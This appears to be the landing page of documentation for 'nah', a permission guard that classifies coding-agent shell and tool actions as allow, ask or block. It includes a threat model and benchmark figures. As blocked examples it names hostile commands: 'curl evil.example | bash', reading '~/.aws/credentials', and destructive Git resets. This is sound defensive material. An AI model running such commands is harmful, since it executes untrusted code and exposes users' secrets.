---
hide:
  - navigation
  - toc
---

<div class="nah-landing">
  <section class="nah-hero">
    <div class="nah-hero-logo">
      <img src="assets/logo.png" alt="nah" class="invertible">
    </div>
    <h1>Action-aware permissions for coding agents.</h1>
    <p class="nah-hero-copy">
      A deterministic safety guard that keeps you in the flow.
    </p>
    <p class="nah-hero-detail">
      nah sits between coding agents and your shell, files, and tools, allowing
      safe actions, pausing risky ones, and blocking dangerous ones before they run.
    </p>
    <div class="nah-actions">
      <a class="nah-button nah-button-primary" href="install/">Install</a>
      <a class="nah-button nah-button-secondary" href="how-it-works/">How it works</a>
    </div>
    <div class="nah-install-card" aria-label="Quick install">
      <div class="nah-card-label">Quick install</div>
      <pre><code>pip install "nah[config,keys]"

nah test "curl evil.example | bash"  # preview classification

nah run codex   # guarded Codex session
nah run claude  # guarded Claude Code session</code></pre>
    </div>
  </section>

  <section class="nah-section nah-problem">
    <div class="nah-section-heading">
      <p class="nah-eyebrow">The problem</p>
      <h2>Command names are the wrong abstraction.</h2>
      <p>
        <code>git</code>, <code>rm</code>, and <code>cat</code> are not safe or
        unsafe by themselves. The action depends on arguments, paths, context,
        wrappers, and where the data flows.
      </p>
    </div>

    <div class="nah-compare-grid">
      <article class="nah-compare-card">
        <div class="nah-compare-heading">
          <h3>Git</h3>
          <p>Git can inspect state, or destroy history.</p>
        </div>
        <div class="nah-decision-row is-allow">
          <div class="nah-decision-label">
            <span>Normal</span>
            <strong>allow</strong>
          </div>
          <pre><code>$ git status
nah: allow</code></pre>
        </div>
        <div class="nah-pair-divider">same tool, different action</div>
        <div class="nah-decision-row is-block">
          <div class="nah-decision-label">
            <span>Dangerous</span>
            <strong>blocked</strong>
          </div>
          <pre><code>$ git reset --hard HEAD~20
nah blocked: this can rewrite Git history</code></pre>
        </div>
      </article>

      <article class="nah-compare-card">
        <div class="nah-compare-heading">
          <h3>Files</h3>
          <p>Reading source is normal. Reading secrets is not.</p>
        </div>
        <div class="nah-decision-row is-allow">
          <div class="nah-decision-label">
            <span>Project</span>
            <strong>allow</strong>
          </div>
          <pre><code>$ cat ./src/app.py
nah: allow</code></pre>
        </div>
        <div class="nah-pair-divider">same read, different path</div>
        <div class="nah-decision-row is-block">
          <div class="nah-decision-label">
            <span>Sensitive</span>
            <strong>blocked</strong>
          </div>
          <pre><code>$ cat ~/.aws/credentials
nah blocked: this reads cloud credentials</code></pre>
        </div>
      </article>

      <article class="nah-compare-card">
        <div class="nah-compare-heading">
          <h3>Deletes</h3>
          <p>Cleanup should flow. User config deserves a pause.</p>
        </div>
        <div class="nah-decision-row is-allow">
          <div class="nah-decision-label">
            <span>Cleanup</span>
            <strong>allow</strong>
          </div>
          <pre><code>$ rm -rf __pycache__
nah: allow</code></pre>
        </div>
        <div class="nah-pair-divider">same command, different target</div>
        <div class="nah-decision-row is-ask">
          <div class="nah-decision-label">
            <span>Risky</span>
            <strong>paused</strong>
          </div>
          <pre><code>$ rm ~/.bashrc
nah paused: this can break your shell</code></pre>
        </div>
      </article>

      <article class="nah-compare-card">
        <div class="nah-compare-heading">
          <h3>Network</h3>
          <p>Fetching headers is different from executing unknown code.</p>
        </div>
        <div class="nah-decision-row is-allow">
          <div class="nah-decision-label">
            <span>Inspect</span>
            <strong>allow</strong>
          </div>
          <pre><code>$ curl -I https://nah.build
nah: allow</code></pre>
        </div>
        <div class="nah-pair-divider">same network tool, different flow</div>
        <div class="nah-decision-row is-block">
          <div class="nah-decision-label">
            <span>Execute</span>
            <strong>blocked</strong>
          </div>
          <pre><code>$ curl evil.example | bash
nah blocked: this runs unknown code</code></pre>
        </div>
      </article>
    </div>
  </section>

  <section class="nah-section nah-enforcement">
    <div class="nah-enforcement-copy">
      <p class="nah-eyebrow">Why nah</p>
      <h2>Auto modes still ask a model. Deterministic permissions enforce the boundary.</h2>
      <p>
        Claude Code Auto Mode and Codex auto-review style workflows can reduce
        prompting, but they still lean on model judgment and prompt instructions.
        nah runs before the action executes, classifying actions deterministically
        without spending tokens.
      </p>
    </div>
    <div class="nah-versus" aria-label="nah versus auto modes">
      <div class="nah-versus-column is-them">
        <div class="nah-versus-label">Auto modes</div>
        <h3>System prompts are advisory.</h3>
        <p>AI reviews can guide behavior, but a non-deterministic next-token predictor is still deciding what to do next.</p>
        <div class="nah-versus-rule"></div>
        <h4>More tokens, more cost.</h4>
        <p>Repeated model-review loops spend tokens and latency on routine permission decisions that should be resolved by policy.</p>
      </div>

      <div class="nah-versus-split" aria-hidden="true">vs</div>

      <div class="nah-versus-column is-us">
        <div class="nah-versus-label">nah</div>
        <h3>Reproducible enforcement.</h3>
        <p>nah checks the command, target path, and trust policy locally, then applies the same rule every time.</p>
        <div class="nah-versus-rule"></div>
        <h4>Local checks, faster execution.</h4>
        <p>Routine decisions happen locally in milliseconds, without another model round trip or extra tokens spend.</p>
      </div>
    </div>
  </section>

  <section class="nah-section nah-flow">
    <div class="nah-flow-copy">
      <p class="nah-eyebrow">The idea</p>
      <h2>Classify actions, not command names.</h2>
      <p>
        nah maps commands and tool calls into 40 action types, from
        <code>filesystem_read</code>, <code>network_outbound</code>, and
        <code>package_install</code> to <code>db_write</code>,
        <code>container_destructive</code>, and <code>agent_exec_bypass</code>.
        Then it adds flags, paths, trusted locations, sensitive files, runtimes,
        hosts, and database targets before returning <code>allow</code>,
        <code>ask</code>, or <code>block</code>.
      </p>
    </div>
    <div class="nah-flow-steps">
      <div class="nah-flow-step" tabindex="0">
        <span>1</span>
        <div>
          <strong>Parse</strong>
          <p>Read the command or tool call before it runs.</p>
        </div>
      </div>
      <div class="nah-flow-step" tabindex="0">
        <span>2</span>
        <div>
          <strong>Classify</strong>
          <p>Map it to action types like <code>git_history_rewrite</code>, <code>network_outbound</code>, or <code>filesystem_delete</code>.</p>
        </div>
      </div>
      <div class="nah-flow-step" tabindex="0">
        <span>3</span>
        <div>
          <strong>Add context</strong>
          <p>Add project root, trusted paths, sensitive files, runtime, hosts, and database targets.</p>
        </div>
      </div>
      <div class="nah-flow-step" tabindex="0">
        <span>4</span>
        <div>
          <strong>Decide</strong>
          <p>Apply your config and classifiers, then return <code>allow</code>, <code>ask</code>, or <code>block</code>.</p>
        </div>
      </div>
      <div class="nah-flow-step" tabindex="0">
        <span>5</span>
        <div>
          <strong>Log</strong>
          <p>Record the decision so you can inspect what ran, what asked, and what was blocked.</p>
        </div>
      </div>
    </div>
  </section>

  <section class="nah-section nah-config">
    <div class="nah-section-heading nah-config-heading">
      <p class="nah-eyebrow">Configuration</p>
      <h2>Policy belongs in the repo, not in the prompt.</h2>
      <p>
        nah works with zero config. Security-minded users and teams can still
        encode reviewable rules as YAML or CLI commands: global defaults for
        the user, project <code>.nah.yaml</code> for tighten-only team policy.
      </p>
    </div>
    <div class="nah-config-layout">
      <article class="nah-config-card">
        <div class="nah-card-label">.nah.yaml</div>
        <pre><code># project policy: tighten only by default
actions:
  db_write: block
  network_outbound: ask
  git_remote_write: ask

classify:
  db_write:
    - "just migrate-prod"
  network_outbound:
    - "bin/sync-crm"
  filesystem_delete:
    - "task clean-artifacts"</code></pre>
      </article>
      <article class="nah-config-card">
        <div class="nah-card-label">CLI</div>
        <pre><code>nah config show
nah deny db_write --project
nah classify "just migrate-prod" db_write --project
nah classify "bin/sync-crm" network_outbound --project
nah trust api.example.com
nah test "just migrate-prod"</code></pre>
      </article>
    </div>
    <a class="nah-inline-link" href="configuration/">Read the config guide</a>
  </section>

  <section class="nah-section nah-threat">
    <div class="nah-section-heading nah-threat-heading">
      <p class="nah-eyebrow">Threat model</p>
      <h2>A threat model for agentic coding.</h2>
      <p>
        nah's threat model starts with what an action can do: run unknown code,
        expose secrets, rewrite history, escape the project, hide behavior
        behind shell tricks, escalate through package or container tooling, or
        tamper with the guard itself.
      </p>
    </div>
    <div class="nah-threat-grid">
      <article class="nah-threat-card">
        <strong>Unknown code execution</strong>
        <span><code>curl | bash</code>, downloaded scripts, command substitution</span>
      </article>
      <article class="nah-threat-card">
        <strong>Secret exposure</strong>
        <span>SSH keys, <code>.env</code>, cloud credentials, credential searches</span>
      </article>
      <article class="nah-threat-card">
        <strong>History and state damage</strong>
        <span>force pushes, hard resets, destructive Git flows</span>
      </article>
      <article class="nah-threat-card">
        <strong>Project boundary escapes</strong>
        <span>reads or writes outside the project or trusted paths</span>
      </article>
      <article class="nah-threat-card">
        <strong>Shell evasion</strong>
        <span>wrapper commands, redirects, nested shells, obfuscated execution</span>
      </article>
      <article class="nah-threat-card">
        <strong>Tool escalation</strong>
        <span>package installs, containers, MCP tools, guard tampering</span>
      </article>
    </div>
    <div class="nah-threat-proof">
      <div>
        <strong>1,807</strong>
        <span>audit hits</span>
      </div>
      <div>
        <strong>13</strong>
        <span>tested danger classes</span>
      </div>
      <div>
        <strong>0</strong>
        <span>required runtime dependencies</span>
      </div>
      <a href="threat-model/">Read the full threat model</a>
    </div>
  </section>

  <section class="nah-section nah-benchmark">
    <div class="nah-section-heading nah-benchmark-heading">
      <p class="nah-eyebrow">Friction benchmark</p>
      <h2>Routine agent work should not need another review loop.</h2>
      <p>
        Across 101,194 extracted Bash tool calls from the public
        <a href="https://huggingface.co/datasets/novita/agentic_code_dataset_22">Novita Claude Code trace</a>,
        excluding the dataset-specific <code>reminder</code> app CLI, nah asked
        on 4.2% and resolved 95.8% deterministically.
      </p>
    </div>
    <div class="nah-benchmark-grid">
      <article class="nah-benchmark-card is-accented">
        <span>No review loop</span>
        <strong>95.8%</strong>
        <p>Resolved locally without model review or user interruption.</p>
      </article>
      <article class="nah-benchmark-card">
        <span>Permission pause</span>
        <strong>4.2%</strong>
        <p>Paused for ambiguity, unknown CLIs, sensitive paths, or replay artifacts.</p>
      </article>
      <article class="nah-benchmark-card">
        <span>Routine work flowed</span>
        <strong>99.945%</strong>
        <p>Recognized read-only/local-safe Bash calls resolved deterministically.</p>
      </article>
    </div>
    <a class="nah-inline-link" href="https://github.com/manuelschipper/nah/blob/main/docs/benchmarks/novita-bash-friction.md">Benchmark methodology</a>
  </section>

  <section class="nah-section nah-llm">
    <div class="nah-section-heading nah-llm-heading">
      <p class="nah-eyebrow">Optional LLM review</p>
      <h2>Bring your own model. Keep deterministic enforcement.</h2>
      <p>
        Agent auto modes use the model they provide. nah can optionally consult
        your local or remote provider for narrow intent-sensitive review, while
        deterministic policy still owns the boundary.
      </p>
    </div>
    <div class="nah-llm-grid">
      <article class="nah-llm-card">
        <strong>Intent-aware</strong>
        <span>Uses recent transcript context to check whether the action matches what you asked for.</span>
      </article>
      <article class="nah-llm-card">
        <strong>Veto, not override</strong>
        <span>Risky generated content can escalate to <code>ask</code>. Deterministic blocks stay blocked.</span>
      </article>
      <article class="nah-llm-card">
        <strong>Your provider</strong>
        <span>Use local Ollama or remote providers. If review is unavailable, deterministic policy stands.</span>
      </article>
    </div>
    <article class="nah-llm-config-card">
      <div class="nah-card-label">Global config</div>
      <pre><code># ~/.config/nah/config.yaml
llm:
  mode: on
  providers: [openrouter]
  openrouter:
    model: google/gemini-3.1-flash-lite-preview</code></pre>
      <div class="nah-card-label nah-card-label-secondary">CLI</div>
      <pre><code>nah key set openrouter</code></pre>
      <span>Secrets stay in your OS keychain. Project config cannot set provider keys.</span>
    </article>
    <a class="nah-inline-link" href="configuration/llm/">Configure LLM review</a>
  </section>

  <section class="nah-section">
    <div class="nah-section-heading">
      <p class="nah-eyebrow">Runtimes</p>
      <h2>One guard, multiple approval surfaces.</h2>
    </div>
    <div class="nah-runtime-grid">
      <a class="nah-runtime-card" href="runtimes/claude-code/">
        <div class="nah-runtime-title">
          <svg class="nah-runtime-icon" aria-hidden="true" viewBox="0 0 24 24">
            <path d="M17.3041 3.541h-3.6718l6.696 16.918H24Zm-10.6082 0L0 20.459h3.7442l1.3693-3.5527h7.0052l1.3693 3.5528h3.7442L10.5363 3.5409Zm-.3712 10.2232 2.2914-5.9456 2.2914 5.9456Z"/>
          </svg>
          <strong>Claude Code</strong>
        </div>
        <span>Bash, file, search, notebook, and MCP tool calls before execution.</span>
      </a>
      <a class="nah-runtime-card" href="runtimes/codex/">
        <div class="nah-runtime-title">
          <svg class="nah-runtime-icon" aria-hidden="true" viewBox="0 0 24 24">
            <path d="M22.2819 9.8211a5.9847 5.9847 0 0 0-.5157-4.9108 6.0462 6.0462 0 0 0-6.5098-2.9A6.0651 6.0651 0 0 0 4.9807 4.1818a5.9847 5.9847 0 0 0-3.9977 2.9 6.0462 6.0462 0 0 0 .7427 7.0966 5.98 5.98 0 0 0 .511 4.9107 6.051 6.051 0 0 0 6.5146 2.9001A5.9847 5.9847 0 0 0 13.2599 24a6.0557 6.0557 0 0 0 5.7718-4.2058 5.9894 5.9894 0 0 0 3.9977-2.9001 6.0557 6.0557 0 0 0-.7475-7.0729zm-9.022 12.6081a4.4755 4.4755 0 0 1-2.8764-1.0408l.1419-.0804 4.7783-2.7582a.7948.7948 0 0 0 .3927-.6813v-6.7369l2.02 1.1686a.071.071 0 0 1 .038.052v5.5826a4.504 4.504 0 0 1-4.4945 4.4944zm-9.6607-4.1254a4.4708 4.4708 0 0 1-.5346-3.0137l.142.0852 4.783 2.7582a.7712.7712 0 0 0 .7806 0l5.8428-3.3685v2.3324a.0804.0804 0 0 1-.0332.0615L9.74 19.9502a4.4992 4.4992 0 0 1-6.1408-1.6464zM2.3408 7.8956a4.485 4.485 0 0 1 2.3655-1.9728V11.6a.7664.7664 0 0 0 .3879.6765l5.8144 3.3543-2.0201 1.1685a.0757.0757 0 0 1-.071 0l-4.8303-2.7865A4.504 4.504 0 0 1 2.3408 7.872zm16.5963 3.8558L13.1038 8.364 15.1192 7.2a.0757.0757 0 0 1 .071 0l4.8303 2.7913a4.4944 4.4944 0 0 1-.6765 8.1042v-5.6772a.79.79 0 0 0-.407-.667zm2.0107-3.0231-.142-.0852-4.7735-2.7818a.7759.7759 0 0 0-.7854 0L9.409 9.2297V6.8974a.0662.0662 0 0 1 .0284-.0615l4.8303-2.7866a4.4992 4.4992 0 0 1 6.6802 4.66ZM8.3065 12.863l-2.02-1.1638a.0804.0804 0 0 1-.038-.0567V6.0742a4.4992 4.4992 0 0 1 7.3757-3.4537l-.142.0805L8.704 5.459a.7948.7948 0 0 0-.3927.6813Zm1.0976-2.3654 2.602-1.4998 2.6069 1.4998v2.9994l-2.5974 1.4997-2.6067-1.4997Z"/>
          </svg>
          <strong>Codex</strong>
        </div>
        <span>Local interactive Bash, MCP, and apply_patch permission requests.</span>
      </a>
      <a class="nah-runtime-card" href="runtimes/terminal-guard/">
        <div class="nah-runtime-title">
          <svg class="nah-runtime-icon nah-runtime-icon-terminal" aria-hidden="true" viewBox="0 0 24 24">
            <rect x="3" y="5" width="18" height="14" rx="2.5" ry="2.5"/>
            <path d="m7.5 9 3 3-3 3"/>
            <path d="M12.5 15h4"/>
          </svg>
          <strong>Your shell</strong>
        </div>
        <span>Commands you type yourself in guarded bash and zsh sessions.</span>
      </a>
    </div>
  </section>

  <section class="nah-final">
    <p class="nah-eyebrow">Keep the flow state</p>
    <h2>Let agents work. Stop the expensive mistakes.</h2>
    <div class="nah-actions">
      <a class="nah-button nah-button-primary" href="install/">Install</a>
      <a class="nah-button nah-button-secondary" href="https://github.com/manuelschipper/nah">
        <svg class="nah-button-icon" aria-hidden="true" viewBox="0 0 24 24">
          <path d="M12 .5C5.65.5.5 5.65.5 12c0 5.09 3.29 9.4 7.86 10.93.58.11.79-.25.79-.56v-2.18c-3.2.7-3.87-1.36-3.87-1.36-.52-1.33-1.28-1.68-1.28-1.68-1.05-.72.08-.71.08-.71 1.16.08 1.77 1.19 1.77 1.19 1.03 1.76 2.7 1.25 3.36.96.1-.75.4-1.25.73-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.25.45-2.28 1.19-3.08-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.18.92-.26 1.91-.38 2.89-.39.98 0 1.97.13 2.89.39 2.21-1.49 3.18-1.18 3.18-1.18.63 1.58.23 2.75.11 3.04.74.8 1.19 1.83 1.19 3.08 0 4.42-2.69 5.38-5.25 5.67.41.35.78 1.05.78 2.12v3.21c0 .31.21.67.8.56A11.51 11.51 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5Z"/>
        </svg>
        GitHub
      </a>
    </div>
  </section>
</div>
